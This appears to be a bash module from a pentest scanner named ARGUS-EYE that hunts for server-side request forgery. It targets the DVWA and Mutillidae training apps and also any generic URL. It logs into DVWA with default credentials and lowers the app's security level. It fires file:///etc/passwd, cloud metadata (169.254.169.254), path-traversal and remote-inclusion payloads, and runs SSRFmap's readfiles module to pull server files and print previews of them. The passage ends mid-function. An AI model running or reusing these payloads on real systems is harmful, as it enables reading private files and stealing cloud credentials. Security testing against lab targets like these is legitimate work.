#!/bin/bash
# ================================================
# ARGUS-EYE - SSRF Scanner Module
# Tools: ssrfmap, custom_tests
# ================================================

SCANNER_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CORE_DIR="$(cd "$SCANNER_DIR/../core" && pwd)"
SCRIPT_DIR="$(cd "$SCANNER_DIR/../.." && pwd)"
TEMP_DIR="/tmp/argus_ssrf_$$"
mkdir -p "$TEMP_DIR"

source "$CORE_DIR/utils.sh"
source "$CORE_DIR/installer.sh"
source "$CORE_DIR/tool_selection.sh"

# ================================================
# PROGRESS TRACKING
# ================================================
TOTAL_STEPS=0; CURRENT_STEP=0; PROGRESS_BAR_WIDTH=40

init_progress() {
    TOTAL_STEPS=$1; CURRENT_STEP=0
    >&2 echo ""
    >&2 echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    >&2 echo -e "${CYAN}║                   SSRF SCAN PROGRESS                        ║${NC}"
    >&2 echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    >&2 echo ""
}
update_progress() {
    CURRENT_STEP=$((CURRENT_STEP+1))
    local p=$((CURRENT_STEP*100/TOTAL_STEPS))
    local f=$((p*PROGRESS_BAR_WIDTH/100))
    local e=$((PROGRESS_BAR_WIDTH-f))
    >&2 printf "\r${YELLOW}[${NC}"
    for ((i=0;i<f;i++)); do >&2 printf "${GREEN}▓${NC}"; done
    for ((i=0;i<e;i++)); do >&2 printf "${WHITE}░${NC}"; done
    >&2 printf "${YELLOW}] ${p}%% ${CYAN}($CURRENT_STEP/$TOTAL_STEPS)${NC} $1"
}
complete_progress() {
    >&2 echo ""; >&2 echo ""
    >&2 echo -e "${GREEN}✓ Scan completed!${NC}"
}
show_step() {
    local s=$1 t=$2 tool=$3 st=$4
    case $st in
        "start")    >&2 echo -ne "\n ${CYAN}▶ Step $s/$t:${NC} Running $tool... " ;;
        "complete") >&2 echo -e "${GREEN}✓${NC}" ;;
        "fail")     >&2 echo -e "${RED}✗${NC}" ;;
    esac
}
spinner() {
    local pid=$1 delay=0.1 spinstr='|/-\'
    while kill -0 "$pid" 2>/dev/null; do
        local temp=${spinstr#?}
        >&2 printf " [%c] " "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        >&2 printf "\b\b\b\b\b\b"
    done
    >&2 printf "      \b\b\b\b\b\b"
}

# ================================================
# TARGET TYPE DETECTION
# ================================================
DVWA_BASE=""
TARGET_TYPE=""

detect_target_type() {
    local target=$1
    DVWA_BASE=""
    TARGET_TYPE="generic"

    if echo "$target" | grep -qi "mutillidae"; then
        local mutil_base
        mutil_base=$(echo "$target" | sed -E 's#(https?://[^/]+/[^/]+).*#\1#')
        TARGET_TYPE="mutillidae"
        >&2 echo -e "${GREEN}[✓] Mutillidae detected at: $mutil_base${NC}"
        return 0
    fi

    local host_base
    host_base=$(echo "$target" | grep -oP 'https?://[^/]+')
    local candidates=("${host_base}/dvwa" "${host_base}/DVWA" "$target")
    for candidate in "${candidates[@]}"; do
        local page
        page=$(curl -s --max-time 5 "${candidate}/login.php" 2>/dev/null)
        if echo "$page" | grep -qi "damn vulnerable" && \
           echo "$page" | grep -qi "username\|password\|Login"; then
            DVWA_BASE="$candidate"
            TARGET_TYPE="dvwa"
            >&2 echo -e "${GREEN}[✓] DVWA detected at: $DVWA_BASE${NC}"
            return 0
        fi
    done

    >&2 echo -e "${YELLOW}[*] Generic target${NC}"
    TARGET_TYPE="generic"
    return 1
}

# ================================================
# DVWA AUTO-LOGIN
# ================================================
dvwa_autologin() {
    local base_url=$1
    local cookie_jar="/tmp/dvwa_cookies"

    if [[ -f "$cookie_jar" ]]; then
        local test_check
        test_check=$(curl -s --max-time 3 -b "$cookie_jar" "${base_url}/index.php" 2>/dev/null)
        if echo "$test_check" | grep -qi "Welcome\|Logout\|DVWA Security"; then
            >&2 echo -e "${GREEN}[✓] Existing DVWA session valid — reusing${NC}"
            return 0
        fi
    fi

    rm -f "$cookie_jar"
    >&2 echo -e "\n${CYAN}[*] Logging into DVWA at ${base_url}...${NC}"
    curl -s -c "$cookie_jar" "${base_url}/login.php" -o /tmp/dvwa_lp_$$.html 2>/dev/null
    curl -s -c "$cookie_jar" -b "$cookie_jar" \
        -X POST "${base_url}/login.php" \
        --data-urlencode "username=admin" \
        --data-urlencode "password=admin" \
        --data-urlencode "Login=Login" \
        -L -o /dev/null 2>/dev/null
    curl -s -c "$cookie_jar" -b "$cookie_jar" \
        -X POST "${base_url}/security.php" \
        --data "security=low&seclev_submit=Submit" \
        -o /dev/null 2>/dev/null
    rm -f /tmp/dvwa_lp_$$.html

    local check
    check=$(curl -s -b "$cookie_jar" "${base_url}/index.php" 2>/dev/null)
    if echo "$check" | grep -qi "Welcome\|Logout\|DVWA Security"; then
        >&2 echo -e "${GREEN}[✓] DVWA login successful${NC}"
        return 0
    fi
    >&2 echo -e "${RED}[!] DVWA login failed${NC}"
    return 1
}

# ================================================
# SSRF LISTENER
# ================================================
SSRF_SERVER_PID=""

start_ssrf_listener() {
    local port=${1:-9292}
    local serve_dir="$TEMP_DIR/ssrf_serve"
    mkdir -p "$serve_dir"
    echo "ARGUS_SSRF_HIT" > "$serve_dir/index.html"
    echo "ARGUS_SSRF_HIT" > "$serve_dir/ssrf.html"
    cd "$serve_dir" && python3 -m http.server "$port" &>/dev/null &
    SSRF_SERVER_PID=$!
    cd - &>/dev/null
    >&2 echo -e "${CYAN}[*] SSRF OOB listener on port $port (PID: $SSRF_SERVER_PID)${NC}"
}

stop_ssrf_listener() {
    if [[ -n "$SSRF_SERVER_PID" ]]; then
        kill "$SSRF_SERVER_PID" 2>/dev/null
        wait "$SSRF_SERVER_PID" 2>/dev/null
        SSRF_SERVER_PID=""
    fi
}

get_local_ip() {
    ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K[\d.]+' | head -1 || \
    hostname -I 2>/dev/null | awk '{print $1}' || echo "127.0.0.1"
}

# ================================================
# TOOL: ssrfmap
# ================================================
#
# ROOT CAUSE ANALYSIS — why SSRFmap always showed 0 findings:
#
# PROBLEM 1 — Wrong module for Mutillidae dns-lookup.php
#   dns-lookup.php uses PHP's dns_get_record() / gethostbyname().
#   These are DNS/network functions — they do NOT handle file:// URIs.
#   The "readfiles" module injects file:///etc/passwd payloads and diffs
#   the HTTP response against a baseline. Since dns_get_record() ignores
#   file:// entirely, both baseline and payload return identical HTML →
#   diff is always "" → SSRFmap logs "Empty response" → zero findings.
#
#   The correct module for a DNS/hostname sink is "portscan":
#   it injects http://127.0.0.1:PORT payloads and detects internal port
#   reachability via response differences — which dns_get_record() DOES expose.
#   "networkscan" adds HTTP ping sweep as secondary confirmation.
#
# PROBLEM 2 — SSRFmap outputs ALL findings via Python logging.info(), not stdout
#   logging.info() writes to the --logfile path AND stderr (when -v is used).
#   Without -v, findings silently go only to the log file.
#   The old code read the log file with an offset (lines before run start),
#   but the offset was computed BEFORE the process started — a race condition
#   on slow disks caused the offset to be wrong and real findings to be skipped.
#   FIX: Use a DEDICATED per-run log file (empty at start = no offset needed).
#        Add -v flag so findings also stream to stderr → captured by 2>&1.
#        sleep 0.5 after wait to let logging flush fully before reading.
#
# PROBLEM 3 — SSRFmap's readfiles module writes exfiltrated files to disk
#   When readfiles confirms a file read, it writes the content to:
#     {CWD}/{target_hostname}/{sanitized_filename}
#   SSRFmap runs from its own directory by default, scattering files there.
#   The original script never checked this directory.
#   FIX: Run SSRFmap inside a controlled TEMP subdir. After run, scan
#        {tempdir}/{hostname}/ for any non-empty files = confirmed findings.
#
# PROBLEM 4 — Findings grep didn't match SSRFmap's actual log strings
#   SSRFmap source emits: "Reading file", "Writing file", "Empty response"
#   None of these matched the old grep pattern ("[+]", "VULN", "vulnerable").
#   FIX: grep now matches the exact strings from SSRFmap's source code.
#
# MODULE SELECTION REFERENCE (based on PHP sink type):
#   dns_get_record() / gethostbyname()    → portscan, networkscan
#   file_get_contents($url) with file://  → readfiles
#   curl($url) / file_get_contents() HTTP → readfiles, networkscan
#   unknown generic target                → readfiles, portscan, networkscan
# ================================================
run_ssrfmap() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "ssrfmap" "start"

    local ssrf_cmd=() ssrfmap_dir=""
    if command -v ssrfmap &>/dev/null; then
        ssrf_cmd=(ssrfmap)
        ssrfmap_dir=$(dirname "$(command -v ssrfmap)")
    elif [[ -f "$SCRIPT_DIR/tools/SSRFmap/ssrfmap.py" ]]; then
        ssrf_cmd=(python3 "$SCRIPT_DIR/tools/SSRFmap/ssrfmap.py")
        ssrfmap_dir="$SCRIPT_DIR/tools/SSRFmap"
    else
        >&2 echo -e "${YELLOW}[*] ssrfmap not found — install via installer option 6${NC}"
        echo "ssrfmap not found — skipped" > "$out"
        show_step "$step" "$total" "ssrfmap" "fail"
        update_progress "ssrfmap skipped (not found)"
        echo "0" > "$TEMP_DIR/ssrfmap_count.tmp"
        return 1
    fi

    > "$out"
    local counter_file="$TEMP_DIR/ssrfmap_count_$$.tmp"
    echo "0" > "$counter_file"

    local local_ip lport=8889
    local_ip=$(get_local_ip)

    local req_file="$TEMP_DIR/ssrfmap_req_$$.txt"
    local ssrf_param ssrf_path ssrf_host cookie_header=""
    local ssrfmap_modules="" ssrfmap_level=1

    case "$TARGET_TYPE" in
        "mutillidae")
            local mutil_base
            mutil_base=$(echo "$target" | sed -E 's#(https?://[^/]+/[^/]+).*#\1#')
            ssrf_host=$(echo "$mutil_base" | grep -oP '(?<=://)([^/:?]+)(:\d+)?')
            # Use arbitrary-file-inclusion via the ?page= parameter.
            # This sink calls PHP include($page) / file_get_contents($page)
            # which IS a real HTTP/file client — readfiles module works here.
            # dns-lookup.php uses dns_get_record() (DNS only) — wrong sink.
            ssrf_path="/mutillidae/index.php?page=SSRF"
            ssrf_param="page"
            ssrfmap_modules="readfiles"
            ssrfmap_level=1
            >&2 echo -e "\n  ${CYAN}└─ ssrfmap: Mutillidae ?page= (arbitrary-file-inclusion)${NC}"
            >&2 echo -e "  ${CYAN}└─ Module: readfiles | Param: $ssrf_param${NC}"
            ;;
        "dvwa")
            ssrf_host=$(echo "$DVWA_BASE" | grep -oP '(?<=://)([^/:?]+)(:\d+)?')
            ssrf_path="/dvwa/vulnerabilities/csrf/?password_new=SSRF&password_conf=SSRF&Change=Change"
            ssrf_param="password_new"
            ssrfmap_modules="readfiles"
            ssrfmap_level=1
            >&2 echo -e "\n  ${YELLOW}└─ ssrfmap: DVWA has no native SSRF page — limited results expected${NC}"
            if [[ -f /tmp/dvwa_cookies ]]; then
                local phpsessid
                phpsessid=$(awk '/PHPSESSID/{print $NF}' /tmp/dvwa_cookies | head -1)
                [[ -n "$phpsessid" ]] && cookie_header="Cookie: PHPSESSID=${phpsessid}; security=low"
            fi
            ;;
        *)
            ssrf_host=$(echo "$target" | grep -oP '(?<=://)([^/:?]+)(:\d+)?(?=[/?]|$)')
            ssrf_path=$(echo "$target" | grep -oP '(?<=://)([^?#]*)' | sed 's|^[^/]*||')
            [[ -z "$ssrf_path" ]] && ssrf_path="/"
            ssrf_param=$(echo "$target" | \
                grep -oP '(?<=[?&])(url|uri|dest|path|host|src|redirect|page|file)(?==)' | head -1)
            [[ -z "$ssrf_param" ]] && ssrf_param=$(echo "$target" | grep -oP '(?<=[?&])[^=&]+' | head -1)
            [[ -z "$ssrf_param" ]] && ssrf_param="url"
            ssrf_path=$(echo "$ssrf_path" | sed "s/\(${ssrf_param}=\)[^&]*/\1SSRF/")
            ssrfmap_modules="readfiles,portscan,networkscan"
            ssrfmap_level=1
            >&2 echo -e "\n  ${CYAN}└─ ssrfmap: generic (param: $ssrf_param, all modules)${NC}"
            ;;
    esac

    {
        echo "GET ${ssrf_path} HTTP/1.1"
        echo "Host: ${ssrf_host}"
        echo "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        echo "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        echo "Connection: close"
        [[ -n "$cookie_header" ]] && echo "$cookie_header"
        echo ""
    } > "$req_file"

    >&2 echo -e "  ${CYAN}└─ Host: $ssrf_host | Param: $ssrf_param | OOB lhost: ${local_ip}:${lport}${NC}"

    # Use a dedicated per-run log file — clean slate, no offset needed.
    # Run SSRFmap with -v so all INFO/DEBUG lines go to stderr too.
    # CWD = $ssrf_run_dir so readfiles writes exfil files here.
    local run_log="$TEMP_DIR/ssrfmap_run_$$.log"
    local ssrf_run_dir="$TEMP_DIR/ssrfmap_cwd_$$"
    mkdir -p "$ssrf_run_dir"

    # BUG FIX — Double-output issue:
    # Old code: process output → $out, then cat $out into $combined,
    # then cat $combined back into $out = every line written twice.
    # FIX: send SSRFmap output ONLY to $run_log (not $out), then
    # parse $run_log once. $out is reserved for the final report.
    local ssrfmap_timeout=90
    (
        cd "$ssrf_run_dir" || exit 1
        "${ssrf_cmd[@]}" \
            -r "$req_file" \
            -p "$ssrf_param" \
            -m "$ssrfmap_modules" \
            --lhost "$local_ip" \
            --lport "$lport" \
            --level "$ssrfmap_level" \
            -v \
            --logfile "$run_log"
    ) >> "$run_log" 2>&1 &
    local ssrfmap_pid=$!

    >&2 echo -e "  ${CYAN}[*] ssrfmap running (max ${ssrfmap_timeout}s)...${NC}"
    local elapsed=0
    while kill -0 "$ssrfmap_pid" 2>/dev/null && [[ $elapsed -lt $ssrfmap_timeout ]]; do
        sleep 2; elapsed=$((elapsed+2))
        >&2 printf "."
    done
    if kill -0 "$ssrfmap_pid" 2>/dev/null; then
        >&2 echo -e "\n  ${YELLOW}[*] ssrfmap timeout (${ssrfmap_timeout}s) — killing${NC}"
        kill "$ssrfmap_pid" 2>/dev/null
        pkill -P "$ssrfmap_pid" 2>/dev/null
    fi
    wait "$ssrfmap_pid" 2>/dev/null
    sleep 0.5  # let Python logging flush
    >&2 echo ""

    # ── Check for exfiltrated files written by readfiles module ──────────
    # SSRFmap readfiles.py creates: {CWD}/{hostname}/{sanitized_filename}
    # hostname "192.168.18.70" → directory "192.168.18.70" (dots kept, no colon)
    # file "/etc/passwd" → filename "_etc_passwd"   (slashes → underscores)
    #
    # We search broadly under ssrf_run_dir in case the hostname format differs.
    local exfil_host_safe="${ssrf_host//:/_}"
    local exfil_dir="$ssrf_run_dir/${exfil_host_safe}"

    # Also try without port suffix if hostname includes port
    local exfil_dir_noport="$ssrf_run_dir/${ssrf_host%%:*}"

    # Find any non-empty files SSRFmap wrote under the run dir
    while IFS= read -r -d '' exfil_file; do
        local fname content
        fname=$(basename "$exfil_file")
        content=$(cat "$exfil_file" 2>/dev/null)
        if [[ -n "$content" ]]; then
            >&2 echo -e "  ${GREEN}[✓] SSRFmap exfiltrated: $fname${NC}"
            {
                echo "[HIGH] SSRF File Read Confirmed — ssrfmap exfiltrated content"
                echo "  Tool     : ssrfmap"
                echo "  Target   : ${ssrf_host}${ssrf_path}"
                echo "  Param    : $ssrf_param"
                echo "  File     : $fname"
                echo "  Preview  : $(echo "$content" | head -3 | tr '\n' ' ')"
                echo "  Severity : HIGH"
                echo ""
            } >> "$findings_file"
            echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
        fi
    done < <(find "$ssrf_run_dir" -type f -not -name "*.log" -print0 2>/dev/null)

    # ── Parse run_log for SSRFmap findings ────────────────────────────────
    # BUG 1 FIX: multi-argument grep.
    #   OLD (broken):
    #     grep -qiE "Reading file|Writing file|" \
    #              "is alive|VULN|" \
    #              "root:x:|/etc/passwd"
    #   bash treats the 2nd and 3rd quoted strings as FILENAMES, not pattern
    #   continuations. grep exits 2 (file not found) → condition always false.
    #   FIX: store the entire pattern in ONE variable → always one grep arg.
    #
    # BUG 2 FIX: ANSI color codes.
    #   SSRFmap emits: [INFO]:\e[32mReading file\e[0m : /etc/passwd
    #   grep "Reading file" never matches because of the \e[32m escape sequence.
    #   FIX: strip ANSI escape codes before matching with sed.
    #
    # We count only "Writing file" lines (one per confirmed file read),
    # not "Reading file" (appears twice per file) to avoid double-counting.
    local _ssrf_find_pattern="Writing file|[Pp]ort [0-9]+ is open|is alive|[Hh]ost.*alive|Vulnerable|VULN|\[\+\]|\[FOUND\]|ssrf confirmed|callback|root:x:|instance-id"

    if [[ -f "$run_log" ]]; then
        # Track which files have already been counted to avoid duplicates
        declare -A _counted_files=()
        while IFS= read -r line; do
            # Strip ANSI escape codes so patterns match clean text
            local clean_line
            clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g; s/\[3[0-9]m//g; s/\[0m//g')

            # Skip banner and noise lines
            [[ "$clean_line" =~ ^[[:space:]]*/[[:space:]]*___ ]] && continue
            [[ "$clean_line" =~ ^\[INFO\]\ Log\ file ]]          && continue
            [[ "$clean_line" =~ ^\[INFO\]:?Module ]]              && continue
            [[ "$clean_line" =~ Empty\ response ]]                && continue
            [[ -z "${clean_line// }" ]]                           && continue

            if echo "$clean_line" | grep -qiE "$_ssrf_find_pattern"; then
                # De-duplicate: extract file path from "Writing file : X to Y"
                local _dedup_key="$clean_line"
                if echo "$clean_line" | grep -qi "Writing file"; then
                    _dedup_key=$(echo "$clean_line" | grep -oP '(?<=Writing file\s*:\s*)\S+' | head -1)
                    _dedup_key="${_dedup_key:-$clean_line}"
                fi
                # Only count if not already counted
                if [[ -z "${_counted_files[$_dedup_key]+x}" ]]; then
                    _counted_files["$_dedup_key"]=1
                    {
                        echo "[HIGH] SSRF Confirmed by ssrfmap"
                        echo "  Tool     : ssrfmap"
                        echo "  Target   : ${ssrf_host}${ssrf_path}"
                        echo "  Param    : $ssrf_param"
                        echo "  Modules  : $ssrfmap_modules"
                        echo "  Finding  : $clean_line"
                        echo "  Severity : HIGH"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                fi
            fi
        done < "$run_log"
    fi

    {
        echo "=== SSRFmap Run Log ==="
        # Strip ANSI codes for cleaner report output
        [[ -f "$run_log" ]] && sed 's/\x1b\[[0-9;]*m//g' "$run_log"
        echo ""
        echo "=== Request Used ==="
        cat "$req_file" 2>/dev/null
        echo ""
        echo "=== Run Directory ==="
        find "$ssrf_run_dir" -type f 2>/dev/null | head -20
    } > "$out"

    rm -f "$req_file"
    rm -rf "$ssrf_run_dir"

    local findings
    findings=$(cat "$counter_file")
    rm -f "$counter_file"
    show_step "$step" "$total" "ssrfmap" "complete"
    update_progress "ssrfmap completed ($findings findings)"
    echo "$findings" > "$TEMP_DIR/ssrfmap_count.tmp"
    return 0
}

# ================================================
# TOOL: custom_tests
# ================================================
run_custom_ssrf_tests() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "Custom Tests" "start"

    local counter_file="$TEMP_DIR/ssrf_count_$$.tmp"
    echo "0" > "$counter_file"

    local local_ip
    local_ip=$(get_local_ip)
    local ssrf_port=9292
    start_ssrf_listener "$ssrf_port"
    sleep 1

    local oob_payload="http://${local_ip}:${ssrf_port}/"
    local internal_pattern="root:x:0:0|/bin/bash|hostname|127\.0\.0\.1|localhost|ARGUS_SSRF_HIT"

    {
        echo "=== CUSTOM SSRF TESTS ==="
        echo "Target      : $target"
        echo "Target type : $TARGET_TYPE"
        echo "OOB listener: $oob_payload"
        echo "Date        : $(date)"
        echo ""

        # ── Mutillidae ────────────────────────────────────────────────────
        if [[ "$TARGET_TYPE" == "mutillidae" ]]; then
            local mutil_base
            mutil_base=$(echo "$target" | sed -E 's#(https?://[^/]+/[^/]+).*#\1#')
            >&2 echo -e "${CYAN}[*] Testing Mutillidae SSRF endpoints${NC}"
            echo "--- Mutillidae SSRF Tests ---"
            echo "Base: $mutil_base"
            echo ""

            # ── 1. dns-lookup.php ─────────────────────────────────────────
            echo "  [dns-lookup.php] — server-side DNS/HTTP requests"
            local dns_payloads=(
                "${local_ip}"
                "127.0.0.1"
                "localhost"
                "${oob_payload}"
                "http://${local_ip}:${ssrf_port}/"
                "http://127.0.0.1/"
                "http://127.0.0.1:80/"
                "http://169.254.169.254/latest/meta-data/"
                "file:///etc/passwd"
            )
            for payload in "${dns_payloads[@]}"; do
                echo -n "    target-lookup-hostname=${payload:0:50}... "
                local response
                response=$(curl -s -L --max-time 8 \
                    "${mutil_base}/index.php?page=dns-lookup.php&target-lookup-hostname=${payload}&dns-lookup-php-submit-button=Lookup+DNS" 2>/dev/null)
                if echo "$response" | grep -qE "$internal_pattern"; then
                    echo "SSRF CONFIRMED ✓"
                    {
                        echo "[HIGH] SSRF Confirmed — dns-lookup.php"
                        echo "  Tool     : custom_tests"
                        echo "  Target   : $mutil_base (Mutillidae)"
                        echo "  URL      : ${mutil_base}/index.php?page=dns-lookup.php&target-lookup-hostname=${payload}&dns-lookup-php-submit-button=Lookup+DNS"
                        echo "  Param    : target-lookup-hostname"
                        echo "  Payload  : $payload"
                        echo "  Evidence : Internal resource content or OOB hit detected"
                        echo "  Severity : HIGH"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                else
                    echo "not vulnerable"
                fi
            done
            echo ""

            # ── 2. arbitrary-file-inclusion.php ───────────────────────────
            echo "  [arbitrary-file-inclusion.php] — remote URL inclusion (needs allow_url_include=On)"
            local rfi_payloads=(
                "${oob_payload}"
                "http://127.0.0.1/"
                "http://127.0.0.1:80/"
                "http://169.254.169.254/latest/meta-data/"
            )
            for payload in "${rfi_payloads[@]}"; do
                echo -n "    page=${payload:0:50}... "
                local response
                response=$(curl -s -L --max-time 8 \
                    "${mutil_base}/index.php?page=${payload}" 2>/dev/null)
                if echo "$response" | grep -qE "$internal_pattern|ARGUS_SSRF_HIT"; then
                    echo "SSRF/RFI CONFIRMED ✓"
                    {
                        echo "[CRITICAL] SSRF/RFI Confirmed — arbitrary-file-inclusion"
                        echo "  Tool     : custom_tests"
                        echo "  Target   : $mutil_base (Mutillidae)"
                        echo "  URL      : ${mutil_base}/index.php?page=${payload}"
                        echo "  Param    : page"
                        echo "  Payload  : $payload"
                        echo "  Evidence : Remote URL fetched by server"
                        echo "  Severity : CRITICAL"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                else
                    echo "not vulnerable"
                fi
            done
            echo ""

            # ── 3. text-file-viewer.php ───────────────────────────────────
            echo "  [text-file-viewer.php] — local file read (pathToFile param)"
            local lfi_payloads=(
                "../../../../etc/passwd"
                "../../../../../etc/passwd"
                "/etc/passwd"
                "../../../../../../etc/hostname"
            )
            for payload in "${lfi_payloads[@]}"; do
                echo -n "    pathToFile=${payload:0:45}... "
                local response
                response=$(curl -s -L --max-time 8 \
                    "${mutil_base}/index.php?page=text-file-viewer.php&pathToFile=${payload}&view-text-file-php-submit-button=View+File" 2>/dev/null)
                if echo "$response" | grep -qE "root:x:0:0|daemon:x|/bin/bash|/bin/sh"; then
                    echo "LFI CONFIRMED ✓ (file read → SSRF boundary)"
                    {
                        echo "[HIGH] LFI/SSRF Boundary — File Read Confirmed"
                        echo "  Tool     : custom_tests"
                        echo "  Target   : $mutil_base (Mutillidae)"
                        echo "  URL      : ${mutil_base}/index.php?page=text-file-viewer.php&pathToFile=${payload}&view-text-file-php-submit-button=View+File"
                        echo "  Param    : pathToFile"
                        echo "  Payload  : $payload"
                        echo "  Evidence : /etc/passwd content found in response"
                        echo "  Severity : HIGH"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                else
                    echo "not vulnerable"
                fi
            done

        # ── DVWA ─────────────────────────────────────────────────────────
        elif [[ "$TARGET_TYPE" == "dvwa" ]]; then
            >&2 echo -e "${YELLOW}[!] DVWA has no native SSRF vulnerability page${NC}"
            >&2 echo -e "${YELLOW}    Use Mutillidae: http://<ip>/mutillidae${NC}"
            echo "--- DVWA SSRF ---"
            echo "SKIPPED: DVWA on BWA has no SSRF page."
            echo "Use Mutillidae instead: http://192.168.18.70/mutillidae"

        # ── Generic ───────────────────────────────────────────────────────
        else
            >&2 echo -e "${CYAN}[*] Testing generic target for SSRF${NC}"
            echo "--- Generic SSRF Tests ---"

            local base_url
            base_url=$(echo "$target" | cut -d'?' -f1)
            local test_params=("url" "uri" "dest" "redirect" "path" "host" "src" "file" "page" "link" "fetch")
            local existing_param
            existing_param=$(echo "$target" | grep -oP '(?<=[?&])(url|uri|dest|path|host|src|redirect|page|file)(?==)' | head -1)
            [[ -n "$existing_param" ]] && test_params=("$existing_param" "${test_params[@]}")

            for param in "${test_params[@]}"; do
                echo -n "  OOB ?${param}=${oob_payload}... "
                local oob_resp
                oob_resp=$(curl -s -L --max-time 8 "${base_url}?${param}=${oob_payload}" 2>/dev/null)
                if echo "$oob_resp" | grep -q "ARGUS_SSRF_HIT"; then
                    echo "SSRF CONFIRMED (OOB) ✓"
                    {
                        echo "[CRITICAL] SSRF Confirmed — Out-of-Band"
                        echo "  Tool     : custom_tests"
                        echo "  URL      : ${base_url}?${param}=${oob_payload}"
                        echo "  Param    : $param"
                        echo "  Severity : CRITICAL"
                        echo ""
                    } >> "$findings_file"
                    echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                    break
                else
                    echo "no hit"
                fi

                for payload in "http://127.0.0.1/" "http://169.254.169.254/latest/meta-data/" "file:///etc/passwd"; do
                    echo -n "  ?${param}=${payload}... "
                    local response
                    response=$(curl -s -L --max-time 8 "${base_url}?${param}=${payload}" 2>/dev/null)
                    if echo "$response" | grep -qE "root:x:0:0|instance-id|ami-id|hostname"; then
                        echo "SSRF CONFIRMED ✓"
                        {
                            echo "[HIGH] SSRF Confirmed"
                            echo "  Tool     : custom_tests"
                            echo "  URL      : ${base_url}?${param}=${payload}"
                            echo "  Param    : $param"
                            echo "  Payload  : $payload"
                            echo "  Severity : HIGH"
                            echo ""
                        } >> "$findings_file"
                        echo $(( $(cat "$counter_file") + 1 )) > "$counter_file"
                    else
                        echo "not vulnerable"
                    fi
                done
            done
        fi

        local final_count
        final_count=$(cat "$counter_file")
        echo ""
        echo "Custom SSRF tests completed with $final_count findings"

    } > "$out" 2>&1

    stop_ssrf_listener

    local custom_findings
    custom_findings=$(cat "$counter_file")
    rm -f "$counter_file"

    show_step "$step" "$total" "Custom Tests" "complete"
    update_progress "Custom tests completed ($custom_findings findings)"
    echo "$custom_findings" > "$TEMP_DIR/custom_ssrf_count.tmp"
}

# ================================================
# MAIN SSRF SCAN FUNCTION
# ================================================
scan_ssrf() {
    local target=$1 output_dir=$2 selected_tools=$3
    mkdir -p "$output_dir"/{raw_output,findings}
    local findings_file="$output_dir/findings/ssrf_findings.txt"
    local summary_file="$output_dir/raw_output/ssrf_summary.txt"

    detect_target_type "$target"
    [[ "$TARGET_TYPE" == "dvwa" ]] && dvwa_autologin "$DVWA_BASE"

    {
        echo "========================================"
        echo "SSRF SCAN RESULTS"
        echo "========================================"
        echo "Target     : $target"
        echo "TargetType : $TARGET_TYPE"
        echo "Date       : $(date)"
        echo "Tools used : $selected_tools"
        echo "========================================"
        echo ""
    } > "$findings_file"

    >&2 echo -e "${CYAN}\n┌─────────────────────────────────────────────────────────────────────┐"
    >&2 echo -e "│                     SSRF VULNERABILITY SCANNER                     │"
    >&2 echo -e "└─────────────────────────────────────────────────────────────────────┘${NC}"
    >&2 echo -e "${YELLOW}[*] Target     : $target${NC}"
    >&2 echo -e "${YELLOW}[*] Target type: $TARGET_TYPE${NC}"
    >&2 echo -e "${YELLOW}[*] Tools      : $selected_tools${NC}\n"

    IFS=' ' read -ra TOOL_ARRAY <<< "$selected_tools"
    local total_tools=${#TOOL_ARRAY[@]}
    init_progress $total_tools
    local total_findings=0 tools_run=0 tools_success=0

    for tool in "${TOOL_ARRAY[@]}"; do
        tools_run=$((tools_run+1))
        local tool_output="$output_dir/raw_output/${tool}_ssrf.txt"
        local tool_findings=0

        case $tool in
            "ssrfmap")
                if run_ssrfmap "$target" "$tool_output" "$findings_file" \
                        "$tools_run" "$total_tools"; then
                    tools_success=$((tools_success+1))
                fi
                if [[ -f "$TEMP_DIR/ssrfmap_count.tmp" ]]; then
                    tool_findings=$(cat "$TEMP_DIR/ssrfmap_count.tmp")
                    rm -f "$TEMP_DIR/ssrfmap_count.tmp"
                fi
                ;;
            "custom_tests")
                run_custom_ssrf_tests "$target" "$tool_output" "$findings_file" \
                    "$tools_run" "$total_tools"
                tools_success=$((tools_success+1))
                if [[ -f "$TEMP_DIR/custom_ssrf_count.tmp" ]]; then
                    tool_findings=$(cat "$TEMP_DIR/custom_ssrf_count.tmp")
                    rm -f "$TEMP_DIR/custom_ssrf_count.tmp"
                fi
                ;;
            *)
                >&2 echo -e "${YELLOW}[!] Unknown tool: $tool${NC}"
                ;;
        esac

        [[ "$tool_findings" =~ ^[0-9]+$ ]] || tool_findings=0
        total_findings=$((total_findings + tool_findings))
        echo "$tool findings: $tool_findings" >> "$findings_file"
        >&2 echo ""
    done

    {
        echo ""
        echo "========================================"
        echo "SCAN SUMMARY"
        echo "========================================"
        echo "Tools run       : $tools_run"
        echo "Tools successful: $tools_success"
        echo "Total findings  : $total_findings"
        echo "========================================"
    } >> "$findings_file"

    stop_ssrf_listener 2>/dev/null
    rm -rf "$TEMP_DIR"
    echo "$total_findings" > "$summary_file"
    complete_progress
    >&2 echo -e "${GREEN}[✓] SSRF scan completed${NC}"
    >&2 echo -e "${YELLOW}[*] Tools run: $tools_run/$total_tools${NC}"
    >&2 echo -e "${RED}[*] Total findings: $total_findings${NC}\n"
    echo "$total_findings"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    [[ $# -lt 3 ]] && {
        >&2 echo -e "${RED}[!] Usage: $0 <target_url> <output_dir> <selected_tools>${NC}"
        exit 1
    }
